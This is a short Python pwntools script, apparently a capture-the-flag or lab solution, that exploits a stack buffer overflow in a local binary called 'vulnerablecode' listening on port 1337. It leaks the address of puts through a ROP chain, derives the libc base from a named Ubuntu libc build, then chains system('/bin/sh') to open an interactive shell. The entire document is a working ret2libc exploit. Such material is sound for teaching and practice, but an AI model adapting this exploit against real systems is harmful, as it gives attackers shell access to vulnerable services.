#!/usr/bin/python3

# ================================================
# ROP Exploit by Saket U.
# ================================================

from pwn import *
from pprint import pprint

offset = 56
elf = ELF("../publish/vulnerablecode")

context.arch = "amd64"

# p=elf.process()
p = remote("127.0.0.1", 1337)

rop =ROP(elf)
rop.call(elf.symbols["puts"], [elf.got['puts']])
rop.call(elf.symbols["vuln"])


print(p.recvuntil("\n"))
print(p.recvuntil("\n"))

payload=[
    b"A"*offset,
    rop.chain()
]

# payload=[
#     b"A"*offset,
#     p64(elf.symbols['vuln'])
# ]
payload = b"".join(payload)

p.sendline(payload)

# Printing Address of puts
puts=u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))
log.info(f"puts at {hex(puts)}")

# Load mirror library

libc=ELF("libc6_2.27-3ubuntu1_amd64.so")
libc.address = puts - libc.symbols["puts"]

log.info(f"Libc base is at {hex(libc.address)}")

rop = ROP(libc)
rop.call("puts",[next(libc.search(b"/bin/sh\x00"))])
rop.call("system",[next(libc.search(b"/bin/sh\x00"))])
rop.call("exit")

finalpayload=[
    b"A"*offset,
    rop.chain()
]

finalpayload = b"".join(finalpayload)
p.sendline(finalpayload)

p.interactive()